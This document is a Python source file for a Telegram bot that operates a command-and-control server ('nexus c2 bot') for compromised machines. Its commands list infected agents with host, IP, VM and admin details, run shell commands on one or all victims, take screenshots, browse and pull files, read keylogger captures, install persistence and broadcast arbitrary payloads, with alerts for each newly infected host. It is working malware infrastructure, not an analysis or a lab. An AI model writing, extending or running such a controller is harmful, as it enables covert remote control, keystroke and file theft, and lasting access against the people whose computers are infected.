import asyncio
import json
import os
import sqlite3
import time
from pathlib import Path

import httpx

TOKEN = os.environ.get("TG_TOKEN", "")
CHAT_IDS = {x.strip() for x in os.environ.get("TG_CHATS", "").split(",") if x.strip()}
C2 = os.environ.get("C2_URL", "http://127.0.0.1:8443")
C2_USER = os.environ.get("C2_USER", "8n Dev")
C2_PASS = os.environ.get("C2_PASS", "0120779313001225366247")
DB_PATH = Path(__file__).parent / "c2.db"
API = f"https://api.telegram.org/bot{TOKEN}"
OFFSET_FILE = Path(__file__).parent / ".tg_offset"


def db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con


async def tg(method: str, **kwargs):
    async with httpx.AsyncClient(timeout=30) as c:
        r = await c.post(f"{API}/{method}", json=kwargs)
        return r.json()


async def login():
    async with httpx.AsyncClient(timeout=15) as c:
        r = await c.post(f"{C2}/api/auth/login", data={"username": C2_USER, "password": C2_PASS})
        r.raise_for_status()
        return r.json()["token"]


async def c2get(path: str, token: str):
    async with httpx.AsyncClient(timeout=30) as c:
        r = await c.get(f"{C2}{path}", headers={"Authorization": f"Bearer {token}"})
        r.raise_for_status()
        return r.json()


async def c2post(path: str, token: str, js: dict):
    async with httpx.AsyncClient(timeout=30) as c:
        r = await c.post(f"{C2}{path}", headers={"Authorization": f"Bearer {token}"}, json=js)
        r.raise_for_status()
        return r.json()


async def c2del(path: str, token: str):
    async with httpx.AsyncClient(timeout=30) as c:
        r = await c.delete(f"{C2}{path}", headers={"Authorization": f"Bearer {token}"})
        r.raise_for_status()
        return r.json()


def allowed(chat_id) -> bool:
    return not CHAT_IDS or str(chat_id) in CHAT_IDS


def trunc(s, n=3000):
    return str(s)[:n]


async def handle(msg: dict, token: str):
    chat = msg["chat"]["id"]
    if not allowed(chat):
        return
    text = (msg.get("text") or "").strip()
    if not text:
        return
    parts = text.split()
    cmd = parts[0].lower()
    args = parts[1:] if len(parts) > 1 else []

    if cmd in ["/start", "/help"]:
        await tg("sendMessage", chat_id=chat, text=
            "nexus c2 bot\n\n"
            "/list\n"
            "/info <id>\n"
            "/shell <id> <cmd>\n"
            "/shellall <cmd>\n"
            "/screenshot <id>\n"
            "/files <id> <path>\n"
            "/download <id> <path>\n"
            "/keylog <id>\n"
            "/persist <id>\n"
            "/delete <id>\n"
            "/broadcast <type> <payload>"
        )
        return

    if cmd == "/list":
        agents = await c2get("/api/agents", token)
        if not agents:
            await tg("sendMessage", chat_id=chat, text="no agents")
            return
        lines = []
        for a in agents:
            st = "\U0001f7e2" if a.get("online") else "\u26ab"
            vm = "\U0001f5b2" if a.get("is_vm") else " "
            lines.append(
                f"{st} {a['id'][:10]} | {a.get('hostname','?')} | {a.get('ip','?')} | {a.get('os','?')} | {vm} vm={a.get('is_vm')}"
            )
        await tg("sendMessage", chat_id=chat, text=trunc("\n".join(lines)))
        return

    if cmd == "/info" and args:
        aid = args[0]
        data = await c2get(f"/api/agents/{aid}", token)
        a = data["agent"]
        out = "\n".join(f"{k}: {v}" for k, v in a.items())
        await tg("sendMessage", chat_id=chat, text=trunc(out))
        return

    if cmd == "/shell" and len(args) >= 2:
        aid = args[0]
        scmd = " ".join(args[1:])
        r = await c2post(f"/api/agents/{aid}/task", token, {"type": "shell", "payload": scmd})
        await tg("sendMessage", chat_id=chat, text=f"shell queued -> {r['task_id'][:12]}")
        return

    if cmd == "/shellall" and args:
        scmd = " ".join(args)
        r = await c2post("/api/agents/broadcast", token, {"type": "shell", "payload": scmd})
        await tg("sendMessage", chat_id=chat, text=f"broadcast to {r['sent']} agents")
        return

    if cmd == "/screenshot" and args:
        aid = args[0]
        r = await c2post(f"/api/agents/{aid}/task", token, {"type": "screenshot", "payload": ""})
        await tg("sendMessage", chat_id=chat, text=f"screenshot queued -> {r['task_id'][:12]}")
        return

    if cmd == "/files" and len(args) >= 2:
        aid, fpath = args[0], " ".join(args[1:])
        r = await c2post(f"/api/agents/{aid}/task", token, {"type": "ls", "payload": fpath})
        await tg("sendMessage", chat_id=chat, text=f"ls queued -> {r['task_id'][:12]}")
        return

    if cmd == "/download" and len(args) >= 2:
        aid, fpath = args[0], " ".join(args[1:])
        r = await c2post(f"/api/agents/{aid}/task", token, {"type": "upload", "payload": fpath})
        await tg("sendMessage", chat_id=chat, text=f"download queued -> {r['task_id'][:12]}")
        return

    if cmd == "/keylog" and args:
        aid = args[0]
        data = await c2get(f"/api/keylog/{aid}", token)
        if not data:
            await tg("sendMessage", chat_id=chat, text="no keylog data")
            return
        out = "\n".join(f"[{k['ts'][:19]}] {k['data'][:200]}" for k in data[:50])
        await tg("sendMessage", chat_id=chat, text=trunc(out or "empty"))
        return

    if cmd == "/persist" and args:
        aid = args[0]
        r = await c2post(f"/api/agents/{aid}/task", token, {"type": "persist", "payload": ""})
        await tg("sendMessage", chat_id=chat, text=f"persist queued -> {r['task_id'][:12]}")
        return

    if cmd == "/delete" and args:
        aid = args[0]
        await c2del(f"/api/agents/{aid}", token)
        await tg("sendMessage", chat_id=chat, text=f"deleted {aid[:12]}")
        return

    if cmd == "/broadcast" and len(args) >= 2:
        btype = args[0]
        bpayload = " ".join(args[1:])
        r = await c2post("/api/agents/broadcast", token, {"type": btype, "payload": bpayload})
        await tg("sendMessage", chat_id=chat, text=f"broadcast {btype} to {r['sent']} agents")
        return


async def notify_new_agents(token: str):
    seen = set()
    con = db()
    rows = con.execute("SELECT id FROM agents").fetchall()
    con.close()
    for r in rows:
        seen.add(r["id"])
    while True:
        await asyncio.sleep(15)
        try:
            agents = await c2get("/api/agents", token)
            for a in agents:
                if a["id"] not in seen:
                    seen.add(a["id"])
                    text = (
                        f"new agent\n"
                        f"id: {a['id'][:16]}\n"
                        f"host: {a.get('hostname')}\n"
                        f"user: {a.get('username')}\n"
                        f"ip: {a.get('ip')} / {a.get('internal_ip')}\n"
                        f"os: {a.get('os')} {a.get('arch')}\n"
                        f"vm: {a.get('is_vm')} admin: {a.get('is_admin')}"
                    )
                    for cid in CHAT_IDS or []:
                        await tg("sendMessage", chat_id=cid, text=text)
        except Exception:
            pass


async def main():
    if not TOKEN:
        print("TG_TOKEN not set")
        return
    token = await login()
    print("telegram bot started")
    asyncio.create_task(notify_new_agents(token))
    offset = 0
    if OFFSET_FILE.exists():
        try:
            offset = int(OFFSET_FILE.read_text().strip())
        except:
            pass
    while True:
        try:
            data = await tg("getUpdates", offset=offset, timeout=30)
            for upd in data.get("result", []):
                offset = upd["update_id"] + 1
                OFFSET_FILE.write_text(str(offset))
                if "message" in upd:
                    await handle(upd["message"], token)
        except Exception as e:
            print(f"tg error: {e}")
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())
